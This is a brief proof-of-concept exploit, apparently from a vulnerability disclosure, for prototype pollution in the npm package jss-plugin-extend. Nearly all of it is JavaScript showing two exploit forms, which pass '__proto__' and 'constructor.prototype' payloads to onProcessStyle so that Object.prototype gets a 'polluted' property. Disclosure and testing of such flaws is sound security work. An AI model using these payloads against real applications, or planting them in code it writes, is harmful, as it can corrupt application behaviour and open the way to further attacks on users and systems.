# jss-plugin-extend

- package name: `jss-plugin-extend`

PoC exploit:

```javascript
var extend =require('jss-plugin-extend');

// Exploit Form 1:
extend.default().onProcessStyle({extend: {['__proto__']: {polluted: 'yes'}}}, {}, {});

// Exploit Form 2 (which can be integrated with jss)
extend.default().onProcessStyle({extend: {constructor: {prototype: {polluted: 'yes'}}}}, {}, {});
```